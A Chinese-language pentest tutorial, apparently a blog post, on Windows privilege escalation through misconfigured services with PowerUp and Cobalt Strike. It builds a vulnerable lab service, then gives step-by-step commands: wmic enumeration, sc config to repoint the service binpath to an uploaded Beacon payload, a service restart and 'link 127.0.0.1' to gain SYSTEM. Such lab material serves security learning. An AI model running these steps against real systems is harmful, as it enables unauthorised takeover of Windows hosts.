在渗透测试过程中提权一向都是很关键的一环，利用配置错误的服务进行提升权限是常用方法


最近看了些Powerup提权的演示，无奈自己一直复现不成功，最近花了点时间研究了下，复现过程也够坎坷，技术太菜，终于复现成功了，顺便写个教程分享一下复现的过程


先来了解一下什么是Powerup框架

该程序使用户可以对Windows计算机进行快速检查以查看是否有任何特权升级机会，帮助我们寻找服务器脆弱点进而通过脆弱点进行提权

再来看一下关于不带引号的服务路径可能导致的提权原理

不带引号的服务路径

Windows现在支持包含空格的文件夹名称。当文件路径包含空格时，将整个文件路径封装在双引号中是确保可定位文件的最佳方法

当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。

当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例

如果未引用文件路径，则Windows必须考虑到空格后的文本可能包含命令行参数。Windows从左到右运行，猜测每个空间都有运行，直到它最终成功执行某项为止。这是一个例子：

"C:\Program[.exe]" Files\Microsoft\Bing Bar\7.1\111111111111111111Svc.exe "C:\Program Files\Microsoft\Bing[.exe]" Bar\7.1\111111111111111111Svc.exe "C:\Program Files\Microsoft\Bing Bar\7.1\11Svc.exe"

攻击者可以通过将一个名为Program.exe或Bing.exe的文件放入适当的位置，然后启动服务重新启动或等待服务重新启动来利用此特定漏洞，利用Powerup和CS完全可以做到这一点，其实只用Powerup也可以做到


注：上述的适当位置解释为我们可以放置一个与第一个名称(Program)相同的恶意二进制文件作为文件系统对象，并在其名称中包含空格，并且当服务尝试执行其二进制文件时会将它运行。我们所需要的只是对路径中目录的写权限

那么如何利用个该漏洞呢？简单地说有两种方法

  1. 修改服务的binpath，即将服务的运行程序(exe)指定为另一个路径上面的运行程序(exe)

  2. 替换服务的运行程序为我们生成的payload(exe)


今天我们就先来演示第一种，具有该用户对服务具有足够的权限，可以修改服务的服务路径


马上开始我们的教程


Step1：复现的过程，我们需要用到两个工具，其实用Windows内置的命令也可以实现，但是为了搭建环境过程中更加的方便和便于查看是否搭建好演示环境，所以我们下载这两个软件，分别为：AccessChk和ServiceSecurityEditor

为了复现这个提权的过程，我们必须首先创建一个服务指定的路径为不带引号的服务路径，即我们所说的配置不当的服务，对于这一点，我之前一直在寻找哪一些服务是配置不当，可能算是进入了一个误区，后面发现找不到，我们可以直接创建一个啊，只要服务路径是有空格的而且不带引号的即可


服务配置：

第一步：创建一个带空格的目录，并且在该目录下存放一些文件，这边是创建了一个unquoted path的目录，该目录下有一个文件hello.exe

copy C:\windows\system32\cmd.exe "c:\temp\unquoted path\hello.exe"

第二步：创建一个名为unquotedsvc的服务，如果提示权限不够的话，就用管理员权限创建服务

sc \\localhost create unquotedsvc binpath= "c:\temp\unquoted path\hello.exe" type= interact type= own

第三步：查看该服务的信息

sc qc unquotedsvc

第四步：开启该服务

sc \\localhost start unquotedsvc

到这边，我们为系统创建了一个名为unquotedsvc的配置不当的服务


搭建好服务之后，我们来确定一下当前用户和该服务的权限信息



Step2：查看目前用户可以控制的服务信息，我们使用软件AccessChk进行查看

accesschk.exe -uwcqv "user" *

查看时需要将命令中的kali更改为自己相对应的用户名称

发现没有找到匹配的服务，说明我们刚才创建的服务，kali这个用户没有更改该服务的权限，为了后面的提权，我们需要该用户对该服务有足够多的权限，换句话说，就是因为对该用户配置不当导致了该服务可以用来提权


接下来我们修改服务的权限，注意我们需要先切换到管理员用户，使用我们刚才下载的软件ServiceSecurityEditor进行权限控制，找到相对应的服务并点击Open

添加相对应的用户，并修改权限，如果组和用户名的地方没有相对应的用户，我们需要添加相对应的用户

修改完权限之后，再次来查看一下当前的用户kali对unquoted的服务权限

从图中可以看到对该服务具有完全控制权，这样子我们的提权环境就搭建好了



这边顺便说一下可以用一条命令查找电脑中配置不当的服务

wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

执行完该命令，发现系统中配置不当的服务还算蛮多的，基本都是不带引号的服务路径导致的



Step3：我们回到CS上查看当前用户权限

shell whoami /groups

从图中可以发现kali用户为普通用户，确认完权限信息，准备进行Powerup提权


首先将beacon的睡眠时间调整为5秒

sleep 5

导入Powerup脚本进行自动化查找配置不当的服务，脚本可以后台回复Powerup获取

powershell-import


接下来使用命令调用所有的检查

powershell Invoke-AllChecks

我们注意几个关键地方的输出信息

更重要的是这个输出位置

[*] Checking service permissions...

说明我们对这个服务具有完全的控制权，同时也验证了我们之前环境设置正确，如果没有在此处看到刚才设置的服务，就不要往下复现了，因为这里必须要有相对应的权限

接下来我们通过CS生成服务类的可执行程序替代服务本身指向的exe，即修改服务的binpath，注册表中字段为ImagePath

首先我们新建一个监听器，注意需要是smb类型的监听器，必须为smb类型的，不然到后面执行攻击代码的时候可能会不成功

利用该监听器生成服务类的payload

接下来配置对应的参数，生成payload即可

选择相对应的路径存放payload

回到CS上的beacon命令行中，将刚才生成的payload上传到需要提权的靶机上面



Step4：我们需要先切换路径，并且确保该路径具有可写权限，推荐使用用户的家目录，演示使用的也是kali该用户的家目录

使用以下命令，并选择相对应的文件

upload

我们修改服务的binpath路径

shell sc config unquotedsvc binpath= c:/Users/kali/permit.exe

此处的permit.exe即为我们之前上传的payload


接下来查看binpath服务路径修改有没有成功

shell sc qc unquotedsvc

路径发生改变，说明修改成功


接下来我们需要重启该服务，先停止该服务，发现会报错，错误代码为1062，这边不用去管

shell sc stop unquotedsvc

开启该服务

shell sc start unquotedsvc

从图中可以看到成功启动该服务



Step5：接下来使用以下命令开始提权

link 127.0.0.1

再来看一下CS上线主机，发现多了一个上线主机，并且权限现在为SYSTEM，关于SYSTEM与Administrator之间的区别，可以简单理解成两个用户都为管理员用户，但有的时候SYSTEM的权限比Administrator还大，比如有的时候Administrator管理员用户看不到注册表的内容，SYSTEM管理员可以看到
